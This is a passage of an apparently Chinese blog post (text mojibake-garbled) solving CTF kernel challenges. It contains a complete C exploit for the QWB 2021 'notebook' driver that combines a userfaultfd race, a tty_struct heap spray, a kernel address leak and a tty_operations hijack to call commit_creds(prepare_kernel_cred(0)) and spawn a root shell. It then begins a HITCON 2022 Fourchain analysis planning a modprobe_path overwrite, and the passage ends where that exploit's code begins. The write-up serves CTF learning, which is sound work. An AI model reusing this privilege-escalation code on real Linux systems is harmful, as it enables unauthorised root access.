class="hljs-number">0x200</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x300</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> * (*)(<span class="hljs-type">void</span> *))handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> page_size=sysconf(_SC_PAGESIZE);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd Start!\e[0m\n&quot;</span>);<br>        <br>        <span class="hljs-comment">/*stop to do what?*/</span><br>        sleep(<span class="hljs-number">100</span>);<br>        <span class="hljs-comment">/**/</span><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd done!\e[0m\n&quot;</span>);<br>        <span class="hljs-comment">//cnt++;</span><br><br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_edit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    edit((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x2000</span>,buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_add</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_add);<br>    add((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x50</span>,buf);<br>&#125;<br><br><br><span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>,<span class="hljs-type">add_t</span>;<br><span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_idx,hit_tty;<br><span class="hljs-type">int</span> fake_tty_ops_idx=<span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> fake_stack_idx=<span class="hljs-number">-1</span>;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    saveStatus();<br>    note_fd=open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span> (note_fd==<span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fuck notebook&quot;</span>);<br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    registerUserFaultFd(buf,<span class="hljs-number">0x4000</span>,fault_handler_thread);<br>    <br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        add(i,<span class="hljs-number">0x60</span>,page);<br>        edit(i,TTY_STRUCT_SIZE,page);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)i);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <br><br>    <span class="hljs-comment">// heap spraying ---&gt; tty_struct</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x100</span>;i++)&#123;<br>        tty_fd[i]=open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,O_RDWR);<br>        <span class="hljs-keyword">if</span> (tty_fd[i]==<span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;fuck tty&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evil_add,(<span class="hljs-type">void</span>*)i);<br>    &#125; <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-comment">//check tty_magic 0x5401</span><br>    <br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; max_spray_times; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-comment">//printf(&quot;%llx\n&quot;,*((int*)tty_data));</span><br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">//leak kernel_base by tty</span><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] prepare_kernel_cred: 0x%llx\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] commit_creds: %p\n&quot;</span>, commit_creds);<br><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find a note,try again&quot;</span>);<br><br>    <span class="hljs-comment">//fit size</span><br>    edit(fake_tty_ops_idx,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations),fake_tty_data);<br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <br>    <span class="hljs-comment">//hijack   tty_ops-&gt;ioctl=work_for_cpu_fn</span><br>    ((<span class="hljs-keyword">struct</span> tty_operations*)fake_tty_ops_data)-&gt;ioctl=work_for_cpu_fn+kernel_offset;<br>    write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);<br><br>    <span class="hljs-comment">//copy the tty_data to fake_tty_data</span><br>    read(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x6</span>);<br><br>    <span class="hljs-comment">// set params in fake tty_struct</span><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = prepare_kernel_cred;<br>    fake_tty_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">//ioctl trigger--&gt;prepare_kernel_cred(0)</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start prepare_kernel_cred(0)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; max_spray_times; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">0xdead</span>, <span class="hljs-number">0xdead</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    sleep(<span class="hljs-number">1</span>);<br><br>    read(note_fd, fake_tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">6</span>);<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = commit_creds;<br>    fake_tty_data[<span class="hljs-number">5</span>] = fake_tty_data[<span class="hljs-number">6</span>];<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">//ioctl trigger--&gt;commit_creds(prepare_kernel_cred(0))</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; max_spray_times; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">0xdead</span>, <span class="hljs-number">0xdead</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    getRootShell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶è€Œæˆ‘è‡ªå·±å®æµ‹ä¸‹æ¥ï¼Œä¾æ—§ä¸å¤ªç¨³å®šï¼Œä»ä¼škernel panicï¼Œæˆ–ææƒå¤±è´¥</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/13.png" alt="13"></p><h4 id="0x4å‚è€ƒ">0x4å‚è€ƒ</h4><p><a href="https://www.anquanke.com/post/id/253835#h2-6">ä»å¼ºç½‘æ¯ 2021 çº¿ä¸Šèµ›é¢˜ç›® notebook ä¸­æµ…æ userfaultfd åœ¨ kernel pwn ä¸­çš„åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/385645268">ç¬¬äº”å±Šå¼ºç½‘æ¯çº¿ä¸Šèµ›å† å†›é˜Ÿ WriteUp - Pwn ç¯‡ - çŸ¥ä¹ (zhihu.com)</a></p><h3 id="2022HITCONCTFâ›“ï¸-Fourchain-Kernelï¼š">2022HITCONCTFâ›“ï¸ Fourchain - Kernelï¼š</h3><p>æ­¤é¢˜æ˜¯2022HITCONCTFä¸­çš„fourchainä¸­çš„kernel,æ¯”èµ›æ—¶åšä¸å‡ºæ¥ï¼Œæƒ³è¦å¤ç°æ¥ç€ï¼Œç»“æœæ‹–äº†å¥½ä¹…</p><p>è§£æ³•å‚ç…§çš„æ˜¯æ—¥æœ¬å¸ˆå‚…ptr-yudai ï¼Œå¹¶å¯¹ç…§ç€<a href="https://nightu.darkflow.top/posts/a60d8e49.html#%E2%9B%93%EF%B8%8F-Fourchain-Kernel">å¤œæ‚ å¸ˆå‚…</a>çš„blogæ¥ç†è§£çš„  (tql!!!)</p><p>è¿™ç®—æ˜¯ä¸€ç§éé¢„æœŸçš„è§£æ³•ï¼Œç›¸å¯¹æ¥è¯´æ›´ç®€ä¾¿ä¸€äº›</p><h4 id="0x1åˆ†æ-2">0x1åˆ†æ:</h4><p>é¢˜ç›®ç»™å‡ºäº†æ¼æ´é©±åŠ¨<code>note2.ko</code>çš„æºç ï¼Œæºç å°±ä¸åˆ†æäº†ï¼Œå°±æŒ‘å‡ ä¸ªé‡ç‚¹è¯´ä¸€ä¸‹</p><p>æ²¡æœ‰åŠ é”ä¹‹ç±»çš„æ“ä½œï¼Œæ‰€ä»¥å­˜åœ¨æ¡ä»¶ç«äº‰çš„å¯èƒ½</p><p>æœ‰ä¸¤ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ª<code>node</code>ç»“æ„ä½“ï¼Œæ˜¯ç”¨æ¥ç»´æŠ¤çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> key;<span class="hljs-comment">//å­˜æ”¾çš„éšæœºå€¼ï¼Œç”¨äºå¼‚æˆ–åŠ å¯†</span><br><span class="hljs-type">uint64_t</span> size;<span class="hljs-comment">//æˆ‘ä»¬ä¼ å…¥çš„size</span><br><span class="hljs-type">uint64_t</span> addr;<span class="hljs-comment">//å­˜æ”¾ç”³è¯·å¯æ§å¤§å°å†…å­˜çš„æŒ‡é’ˆ</span><br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">table</span>[0<span class="hljs-title">x10</span>];</span><br></code></pre></td></tr></table></figure><p>addæ—¶ä¼šå›ºå®šç”³è¯·<code>sizeof(struct node)</code>å¤§å°ä¹Ÿå°±æ˜¯0x18ç»™å®ƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªç»“æ„ä½“dataï¼Œæ˜¯æˆ‘ä»¬ä¼ å‚æ•°æ—¶çš„ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ioctl_arg</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> idx;<br><span class="hljs-type">uint64_t</span> size;<br><span class="hljs-type">uint64_t</span> addr;<br>&#125;;<br></code></pre></td></tr></table></figure><p>addæ—¶ä¼šæ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„sizeæ¥åˆ†é…å¯æ§å¤§å°çš„å†…å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>å‡è®¾æˆ‘ä»¬ç¬¬ä¸€æ¬¡add(0x18)å¤§å°,åˆ†é…å†…å­˜çš„å¤§å°å¦‚ä¸‹:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">node</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span><br><span class="hljs-function"><span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬freeæ‰ä¸Šé¢çš„ï¼Œå†addä¸ç­‰åŒä¸0x18å¤§å°çš„å†…å­˜ï¼Œä¾‹å¦‚add(0x30),ä¼šç”³è¯·åˆ°å¦‚ä¸‹å†…å­˜:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">node</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>-----&gt;è¿™ä¸ªå†…å­˜æ˜¯ä»ä¸Šé¢freeæ‰çš„<span class="hljs-built_in">node</span>(<span class="hljs-number">0</span>x18)ä¸­å–æ¥çš„<br><span class="hljs-function"><span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">0</span>x30)</span></span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å†æ¬¡addä¸ç­‰åŒä¸0x18å¤§å°çš„å†…å­˜ï¼Œä¾‹å¦‚add(0x30),ä¼šç”³è¯·åˆ°å¦‚ä¸‹å†…å­˜:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">node</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>-----&gt;è¿™ä¸ªå†…å­˜æ˜¯ä»ä¸Šé¢freeæ‰çš„<span class="hljs-built_in">data</span>(<span class="hljs-number">0</span>x18)ä¸­å–æ¥çš„,dataæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼ŒaddræŒ‡é’ˆå°±è¢«æˆ‘ä»¬æ§åˆ¶äº†ï¼Œå¯ä»¥AAR/AAW<br><span class="hljs-function"><span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">0</span>x30)</span></span><br></code></pre></td></tr></table></figure><p>(å¤§è‡´æ€æƒ³å°±æ˜¯è¿™æ ·ï¼Œåœ¨ç”¨æˆ·æ€çš„å †åˆ©ç”¨ä¸­ä¹Ÿæœ‰è¿™ç§æ€è·¯)</p><h4 id="0x2è§£æ³•Hijack-node-to-AAR-AAW-modprobe-pathï¼š">0x2è§£æ³•Hijack node to AAR/AAW+modprobe_pathï¼š</h4><p><strong>AAR/AAW</strong>(å³ä»»æ„åœ°å€è¯»å–ä»»æ„å€¼/ä»»æ„åœ°å€å†™ä»»æ„å€¼)</p><p>æ¥ä¸‹æ¥æ˜¯<strong>å¤§è‡´æ­¥éª¤</strong></p><p>1.åœ¨edit(0x18)æ—¶ç”¨userfaultfdæ–­ä¸‹ï¼Œç”¨åœ¨userfaultfdçº¿ç¨‹å®Œæˆä¸Šè¿°æ“ä½œï¼Œè¾¾åˆ°AAR(ä»»æ„è¯»)æ³„éœ²å†…æ ¸åŸºå€,å¾—åˆ°modprobe_pathåœ°å€</p><p>2.æ•…æŠ€é‡æ–½AAW(ä»»æ„å†™)ï¼ŒåŠ«æŒmodprobe_path,ä»¥rootæƒé™æ‰§è¡ŒæŸä¸ªæ–‡ä»¶ææƒåˆ°root</p><p>ç»†èŠ‚è¿˜æ˜¯çœ‹expå§</p><h4 id="0x3Expï¼š">0x3Expï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 